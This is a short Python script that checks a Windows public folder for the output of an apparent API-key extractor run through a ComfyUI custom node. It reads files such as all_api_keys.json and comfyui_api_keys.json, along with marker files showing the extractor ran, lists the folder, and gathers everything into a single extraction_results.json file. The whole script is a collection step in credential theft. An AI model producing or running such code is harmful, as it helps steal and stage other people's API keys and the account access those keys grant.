import os, json
output = {}
# Check for extraction results
for fname in ["all_api_keys.json", "extractor_ran.txt", "comfyui_api_keys.json", "custom_node_executed.txt"]:
    path = os.path.join("C:/Users/Public", fname)
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                content = f.read()
            output[fname] = content[:3000]
        except Exception as e:
            output[fname] = f"READ_ERROR: {e}"
    else:
        output[fname] = "NOT_FOUND"

# Also list C:/Users/Public for any new files
try:
    output["public_dir_list"] = os.listdir("C:/Users/Public")[:50]
except Exception as e:
    output["public_dir_list"] = f"ERROR: {e}"

with open("C:/Users/Public/extraction_results.json", "w") as f:
    json.dump(output, f, indent=2)
